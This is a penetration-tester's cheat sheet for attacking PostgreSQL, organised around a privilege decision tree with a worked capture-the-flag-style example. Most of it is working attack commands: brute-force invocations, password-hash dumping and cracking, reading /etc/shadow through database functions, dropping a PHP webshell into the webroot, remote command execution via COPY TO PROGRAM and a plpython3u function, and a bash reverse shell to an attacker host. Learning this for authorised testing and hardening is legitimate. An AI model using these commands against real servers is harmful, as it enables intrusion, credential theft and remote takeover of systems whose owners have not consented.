# PostgreSQL

#PostgreSQL #Postgres #database #RDBMS

## What is PostgreSQL?

Open-source object-relational DBMS, the usual back end behind PHP/Python/Node web apps. Feature-rich alternative to MySQL/MSSQL: stored procedures in multiple languages (PL/pgSQL, PL/Python, PL/Perl), server-side file I/O, and — for a superuser or a suitably-privileged role — **OS command execution built into the SQL layer** (`COPY … TO PROGRAM`). That last point is why it matters on an engagement: DB creds recovered from a web-app config often lead straight to a shell as the `postgres` service account.

- Port **TCP 5432** (default) — frequently **bound to `localhost` only** (`listen_addresses = 'localhost'`), so it's closed to the VPN but wide open once you have any foothold on the host. Re-check `127.0.0.1:5432` after you land a shell.
- Config: `/etc/postgresql/<version>/main/postgresql.conf`
- Auth rules: `/etc/postgresql/<version>/main/pg_hba.conf`
- Default superuser role: `postgres`; on-box it usually has `peer` auth, so `sudo -u postgres psql` needs no password.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Database/psql\|psql]] | The interactive client — connect, enumerate, run every attack primitive below |
| [[Tools/Scanning/NMAP\|NMAP]] | Fingerprint the service and version (`-sV`), run `pgsql-brute` |
| [[Tools/Auth/Hydra\|Hydra]] | Online password brute force against 5432 |
| [[Tools/Auth/Medusa\|Medusa]] | Alternative online brute force (`-M postgres`) |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `postgres_login`, `postgres_sql`, `postgres_schemadump` aux modules |

---

## The decision that actually matters

You almost never get stuck on *syntax* — you get stuck because you don't know **which primitive your account can reach**. Everything hinges on one question: *am I a superuser, and if not, what roles do I hold?* Answer that first, then follow the matching branch. Don't start pasting `COPY … TO PROGRAM` before you know it'll work.

```mermaid
flowchart TD
    A[Have PostgreSQL access<br/>found creds or SQLi] --> B{Superuser?<br/>SELECT current_setting is_superuser}
    B -->|yes| C[RCE is on the table]
    B -->|no| D{Which roles do I hold?<br/>the du meta-command}
    D -->|pg_execute_server_program| C
    D -->|pg_read/write_server_files| E[Server-side file read / write<br/>no shell yet]
    D -->|CREATEROLE| F[Escalate in-DB first<br/>ALTER ROLE me SUPERUSER] --> C
    D -->|none — plain login| G[LOOT MODE<br/>you are not getting a shell from here]
    C --> C1[COPY '' TO PROGRAM 'cmd']
    C --> C2[plpython3u / plperlu UDF]
    C --> C3[lo_export a webshell into the webroot]
    E --> E1[pg_read_file / COPY FROM<br/>lo_export to a writable path]
    G --> G1[Dump pg_authid hashes → crack offline]
    G --> G2[Dump the app's own user table<br/>crack app hashes, reuse passwords to pivot]
```

> [!tip] **The branch people miss is the bottom one.** Everyone knows `COPY … TO PROGRAM` once they're superuser. The place you get stuck is when you connected with a *web-app's* DB account (`dbuser`, `webapp`, …) that is **not** a superuser. That account can't get a shell from the DB — but it can read every row the app can, which usually means the users table full of password hashes. That's the win. See the worked example below.

---

## Enumeration

```bash
# Version + NSE brute
nmap -p 5432 --script pgsql-brute,pgsql-info -sV <target>
```

| Flag / Script | Description |
|---|---|
| `-sV` | Banner/version — the version gates which CVEs and which primitives apply |
| `pgsql-brute` | Credential guessing over the wire |
| `pgsql-info` | Server settings / version detail (if present in your NSE set) |

If 5432 is filtered from the VPN, that's the `listen_addresses='localhost'` case — come back to it *after* you have a foothold and hit it over `127.0.0.1`.

---

## Connect / Access

```bash
# Standard remote connect
psql -h <target> -U <user> -d <db>

# Password without leaking it into shell history
PGPASSWORD='<pass>' psql -h <target> -U <user> -d <db>

# Single query and exit (good from a webshell, no interactive TTY)
PGPASSWORD='<pass>' psql -h 127.0.0.1 -U <user> -d <db> -c "SELECT version();"

# On-box as the service account — peer auth, no password
sudo -u postgres psql
```

> [!warning] **URI form and the `%` trap.** In `psql "postgresql://user:pass@host/db"` the password is URL-decoded, so any literal `%` in it must be written `%25` (and `@`→`%40`, `/`→`%2F`, `:`→`%3A`). A password like `RangeOfMotion%777` becomes `RangeOfMotion%25777` in the URI — but works **verbatim** with `-U … -W` or `PGPASSWORD=`. When in doubt, use `PGPASSWORD=` and skip the encoding puzzle entirely. A mis-encoded `%` gives an *authentication-failed* error that looks like a wrong password, not a bad URI.

### Through a webshell (no interactive shell yet)

```bash
# Each statement is a separate -c; -A -t strips formatting for clean parsing
export PGPASSWORD='<pass>'
psql -h 127.0.0.1 -U <user> -d <db> -A -t -c "SELECT current_user, current_setting('is_superuser')"
```

---

## Enumerate the database

The "look around" step — do this before any attack primitive. Every item is shown **two ways**: the `\` meta-command (fast, interactive `psql` only) and the portable `SELECT` (works through `-c`, a webshell, or **SQL injection**, where `\` commands don't exist).

> [!tip] **`\` commands are a `psql`-client feature, not SQL.** They vanish the moment you're not at an interactive prompt — through SQLi you have *only* the `information_schema` / `pg_catalog` `SELECT`s below. Learn the SQL forms; the backslashes are just shortcuts.

### Databases → switch

```sql
\l                                              -- list databases (meta)
SELECT datname FROM pg_database WHERE datistemplate = false;

\c <db>                                          -- switch DB (meta; reconnects)
-- No SQL equivalent — you must reconnect: psql ... -d <db>. A connection is
-- bound to ONE database; cross-DB queries need dblink/postgres_fdw or a new session.
```

### Schemas

```sql
\dn                                             -- list schemas (meta)
SELECT schema_name FROM information_schema.schemata;
-- Real app data is usually in 'public'; ignore pg_catalog / information_schema.
```

### Tables

```sql
\dt                                             -- tables in current schema (meta)
\dt *.*                                         -- tables in ALL schemas

-- Portable — user tables only, with their schema
SELECT table_schema, table_name
FROM   information_schema.tables
WHERE  table_schema NOT IN ('pg_catalog','information_schema')
ORDER  BY table_schema, table_name;
```

### Columns (describe a table)

```sql
\d <table>                                       -- columns + types + keys (meta)

-- Portable — column names and types for one table
SELECT column_name, data_type
FROM   information_schema.columns
WHERE  table_name = 'users'
ORDER  BY ordinal_position;
```

### Rows

```sql
SELECT * FROM users LIMIT 20;                    -- eyeball it first, tables can be huge
SELECT count(*) FROM users;                      -- how big before you dump
SELECT id, username, password, email FROM users; -- pull the columns that matter
```

### Hunt across the whole database

When you don't know which table holds the loot, let the catalog find it:

```sql
-- Every column whose NAME looks interesting (password/pass/pwd/secret/token/hash/user/email/key)
SELECT table_schema, table_name, column_name
FROM   information_schema.columns
WHERE  table_schema NOT IN ('pg_catalog','information_schema')
  AND  column_name ~* 'pass|pwd|secret|token|hash|user|email|key'
ORDER  BY table_schema, table_name;

-- Row counts for every table at once (planner estimate — instant, no full scan)
SELECT schemaname, relname, n_live_tup
FROM   pg_stat_user_tables
ORDER  BY n_live_tup DESC;
```

> [!note] **psql meta-command cheat sheet** — `\l` databases · `\c db` connect · `\dn` schemas · `\dt` tables · `\d t` describe · `\du` roles · `\df` functions · `\dx` extensions · `\x` toggle expanded (wide rows) · `\o file` tee output · `\i file.sql` run a script · `\! cmd` shell on **your** box · `\copy` client-side COPY · `\q` quit. All are interactive-`psql` only.

---

## Attack Vectors

Work them in the order the decision tree gives you: **know your privilege → pick the branch → run one primitive**.

### Step 1 — who am I and what can I reach

```sql
SELECT current_user, session_user;
SELECT current_setting('is_superuser');            -- 'on' = superuser, RCE branch
SELECT version();                                  -- version gates plpython naming + CVEs
\du                                                 -- roles + membership (look for pg_* roles below)
SELECT rolname FROM pg_roles WHERE pg_has_role(current_user, oid, 'member');
```

The role names that unlock primitives without full superuser (PostgreSQL **11+**):

| Role you hold | What it grants |
|---|---|
| `pg_execute_server_program` | `COPY … TO/FROM PROGRAM` — i.e. **RCE**, same as superuser for this purpose |
| `pg_read_server_files` | `COPY … FROM`, `pg_read_file()`, `lo_import()` — arbitrary server-side **file read** |
| `pg_write_server_files` | `COPY … TO`, `lo_export()` — arbitrary server-side **file write** (→ webshell) |

> [!warning] **"Superuser only" is stale advice.** Pre-11 these primitives were superuser-gated, and a lot of notes/blogs still say so. Since PG 11 they're grantable roles — a non-super account holding `pg_execute_server_program` gets a shell. Always check `\du` before writing the primitive off.

### Credential extraction → offline cracking

```sql
-- Modern PG (rows live in pg_authid; needs superuser to read)
SELECT rolname, rolpassword FROM pg_authid WHERE rolpassword IS NOT NULL;

-- pg_shadow is a superuser-only view over the same data
SELECT usename, passwd FROM pg_shadow;
```

Two hash formats, two hashcat modes — **verify the mode, wrong ones fail silently as "exhausted":**

```bash
# Old MD5 format:  md5<32 hex>   where hash = md5(password + username)
#   strip the "md5" prefix, append ":username" (username is the salt)
hashcat -m 12    pg_md5.txt /usr/share/wordlists/rockyou.txt
#   e.g.  a6343a68d964ca596d9752250d54bb8a:postgres

# SCRAM-SHA-256 (default since PG 14):  SCRAM-SHA-256$<iter>:<salt>$<StoredKey>:<ServerKey>
#   PBKDF2-HMAC-SHA256, 4096 iters — slow, needs a good wordlist
hashcat -m 28600 pg_scram.txt /usr/share/wordlists/rockyou.txt

# From a captured network auth (not the stored hash): PostgreSQL CRAM (MD5)
hashcat -m 11100 pg_cram.txt   /usr/share/wordlists/rockyou.txt
```

> [!note] These are PostgreSQL's *own* login hashes. An **application** built on Postgres usually stores its users in its own table with its own scheme (e.g. `md5($appsalt . $password)`) — that's a different hash you crack with a different mode. See the worked example.

### In-DB privilege escalation (non-super → super)

```sql
-- If you hold CREATEROLE, you can mint a superuser or promote yourself
CREATE ROLE pwn SUPERUSER LOGIN PASSWORD 'pwn';
ALTER ROLE <me> WITH SUPERUSER;

-- Hunt SECURITY DEFINER functions owned by a superuser (run as the owner)
SELECT proname, proowner::regrole
  FROM pg_proc WHERE prosecdef = true AND proowner = 10;   -- 10 = postgres

-- On-box, if you can edit files as the postgres OS user, flipping rolsuper in
-- pg_authid (or a trust line in pg_hba.conf + reload) is game over
```

### Server-side file read

```sql
-- Superuser or pg_read_server_files
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/postgresql/16/main/pg_hba.conf');
SELECT encode(pg_read_binary_file('/etc/shadow'), 'escape');   -- binary/permission-restricted

-- COPY variant (into a temp table)
CREATE TABLE t(x text);  COPY t FROM '/etc/passwd';  SELECT * FROM t;  DROP TABLE t;

-- Large-object variant — the fallback when COPY/pg_read_file is blocked or logged
SELECT lo_import('/etc/passwd', 1337);
SELECT convert_from(lo_get(1337), 'UTF8');            -- PG 9.4+
SELECT lo_unlink(1337);
```

### Server-side file write → webshell

```sql
-- Superuser or pg_write_server_files. Use (SELECT '...') not a table dump —
-- a plain COPY table TO adds column formatting to the file.
COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/sh.php';

-- Where is writable? data_directory is always owned by postgres
SHOW data_directory;

-- Large-object write — arbitrary bytes to an arbitrary path
SELECT lo_from_bytea(1338, decode('PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=', 'base64'));
SELECT lo_export(1338, '/var/www/html/sh.php');
SELECT lo_unlink(1338);
```

> [!note] **`$_GET[0]` not `$_GET[cmd]`** in a PHP webshell dropped this way — a bare word key is a fatal `Error` on PHP 8, and a quoted `'cmd'` collides with surrounding quoting. A numeric index sidesteps both. Collect at `/sh.php?0=id`.

### RCE — COPY TO PROGRAM (the primary path)

PostgreSQL 9.3+. Superuser **or** `pg_execute_server_program`. Runs as the `postgres` OS user.

```sql
-- Fire-and-forget
COPY (SELECT '') TO PROGRAM 'id > /tmp/o';

-- Read the output back through the DB (no shell needed)
CREATE TABLE o(line text);
COPY o FROM PROGRAM 'id; hostname; whoami';
SELECT * FROM o;
DROP TABLE o;

-- Reverse shell (mind the nested quoting)
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"';
```

### RCE — untrusted-language UDF (when COPY TO PROGRAM is unavailable)

Superuser, and the language package must be installed server-side.

```sql
-- MODERN name is plpython3u. plpythonu (Python 2) was REMOVED in PG 12 —
-- CREATE LANGUAGE plpythonu / CREATE EXTENSION plpythonu error out on any
-- current target. Perl equivalent: plperlu.
CREATE EXTENSION IF NOT EXISTS plpython3u;

CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
    import subprocess
    return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

SELECT exec_cmd('id');
```

> [!warning] **Two silent failures here.** (1) `plpythonu` without the `3` fails on PG 12+ — use `plpython3u`. (2) `CREATE EXTENSION` errors *"could not open extension control file"* if the `postgresql-plpython3-<ver>` package isn't installed on the server — that's an infra gap, not a syntax mistake; fall back to `COPY … TO PROGRAM`.

### Trust auth abuse (pg_hba.conf)

```bash
# A `trust` line means NO password for matching connections. Common for local:
#   local   all   all                     trust
#   host    all   all   127.0.0.1/32      trust
psql -h 127.0.0.1 -U postgres        # no password once you're on the host
```

### Brute force

```bash
hydra  -l postgres -P /usr/share/wordlists/rockyou.txt postgres://<target>
medusa -h <target> -u postgres -P /usr/share/wordlists/rockyou.txt -M postgres
nmap   -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=pass.txt <target>
```

### Known CVEs (don't chase blindly — verify version first)

| CVE | Affects | Note |
|---|---|---|
| CVE-2019-9193 | 9.3–11.x | The "COPY FROM PROGRAM RCE" — a *feature*, not a bug; needs superuser/role. Cited a lot; it's just the primitive above. |
| CVE-2025-1094 | ≤ 17.2 | Invalid-UTF-8 quoting escape in `PQescape*` / `psql` — turns an otherwise-safe SQLi into RCE; used in the BeyondTrust chain. Matters when you reach Postgres *through* SQLi. |
| Feb-2026 privesc→RCE class | all majors < 18.2/17.8/16.12/15.16/14.21 | Overwrites `CurrentUserId` to gain superuser → `COPY … TO PROGRAM`. Flag unpatched builds. |

---

## Worked example — non-superuser app account (the common HTB shape)

You looted DB creds from a web app's config (`db_connect.php` / `settings.py` / `.env`) — say `dbuser` / a password, DB `appdb`. 5432 was closed from the VPN; now you have a webshell, so hit it locally.

```bash
export PGPASSWORD='<looted-pass>'
PSQL='psql -h 127.0.0.1 -U dbuser -d appdb -A -t -c'

# 1. Privilege check — the fork in the road
$PSQL "SELECT current_user, current_setting('is_superuser')"
#   dbuser|off      → NOT superuser. No COPY TO PROGRAM, no pg_authid. Loot mode.

# 2. Enumerate what this account CAN see
$PSQL "SELECT tablename FROM pg_tables WHERE schemaname='public'"
$PSQL "\\d users"                          # find the columns

# 3. Dump the application's user table — creds live here, not in pg_authid
$PSQL "SELECT username, password, is_admin FROM users"
```

The app hashed those with its *own* scheme — read the source you already looted to learn it. A very common one is `md5($static_salt . $password)`:

```bash
# Static prefix salt (same for every user) → hashcat -m 20 = md5($salt.$pass)
#   hashline format:  <md5hex>:<salthex>     (salt as hex; "NaCl" = 4e61436c)
hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt
```

Crack an admin's password → log into the app, **and** try it as an SSH/`su` password for any same-named local user (uid 1000 ≈ the first real account). Password reuse across the app DB and the OS is the usual pivot to `user.txt`. No superuser, no `COPY`, still a foothold — because you asked the privilege question first and took the loot branch instead of burning time on `TO PROGRAM` that was never going to run.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Superuser with weak/default/reused password | RCE via `COPY … TO PROGRAM` |
| Account holding `pg_execute_server_program` | RCE without full superuser (PG 11+) |
| `pg_read_server_files` / `pg_write_server_files` granted | Arbitrary server-side file read / write → webshell |
| `pg_hba.conf` `trust` lines | No-password auth for matching hosts/local |
| `listen_addresses = '*'` | DB exposed to the network instead of localhost |
| `plpython3u` / `plperlu` installed | UDF-based RCE for any superuser |
| Unpatched build (< the Feb-2026 minor releases) | Privesc→RCE class, `CurrentUserId` overwrite |
| App storing `md5($salt.$pass)` in its own table | Fast offline cracking once you can read the table |
| `log_connections = off` / no `log_min_duration_statement` | COPY-PROGRAM RCE leaves no audit trail |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (no history leak) | `PGPASSWORD='p' psql -h host -U user -d db` |
| On-box as service acct | `sudo -u postgres psql` |
| Am I superuser? | `SELECT current_setting('is_superuser')` |
| What roles do I hold? | `\du` |
| List databases | `\l` / `SELECT datname FROM pg_database` |
| Switch database | `\c <db>` (reconnects — one DB per session) |
| List tables | `\dt *.*` / `SELECT table_schema,table_name FROM information_schema.tables` |
| Describe columns | `\d <table>` / `SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'` |
| Dump rows | `SELECT * FROM users LIMIT 20` / `SELECT count(*) FROM users` |
| Hunt cred columns | `SELECT table_name,column_name FROM information_schema.columns WHERE column_name ~* 'pass\|user\|token\|hash'` |
| Dump DB login hashes | `SELECT rolname,rolpassword FROM pg_authid` |
| Crack pg MD5 / SCRAM | `hashcat -m 12 …` / `hashcat -m 28600 …` |
| Read file | `SELECT pg_read_file('/etc/passwd')` |
| Write webshell | `COPY (SELECT '<?php system($_GET[0]);?>') TO '/var/www/html/sh.php'` |
| RCE | `COPY (SELECT '') TO PROGRAM 'id'` |
| RCE (UDF) | `CREATE EXTENSION plpython3u;` → function → `SELECT exec_cmd('id')` |
| Escalate in-DB | `ALTER ROLE me WITH SUPERUSER` (needs CREATEROLE) |
| Brute force | `hydra -l postgres -P rockyou.txt postgres://host` |

---

*Created: 2026-07-13*
*Updated: 2026-08-18*
*Model: claude-opus-5*
